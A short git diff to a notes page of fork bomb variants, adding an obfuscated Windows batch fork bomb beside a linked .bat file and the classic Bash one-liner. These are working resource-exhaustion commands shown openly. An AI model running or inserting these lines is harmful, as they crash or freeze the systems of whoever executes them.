@@ -25,6 +25,12 @@ goto :start
 ```
 [github.com /Altherneum/.github /blob/main /note /OS/Windows /forkBomb2.bat](https://github.com/Altherneum/.github/blob/main/note/OS/Windows/forkBomb2.bat)
 
+## Variante Windows 2 (Batch)
+```
+@echo.%0^|%0>$^_^.c^md&$_>nul
+```
+[github.com /Altherneum/.github /blob/main /note /OS/Windows /forkBomb3.bat](https://github.com/Altherneum/.github/blob/main/note/OS/Windows/forkBomb3.bat)
+
 ## Variante Linux (Bash)
 ```
 :(){ :|:& };:
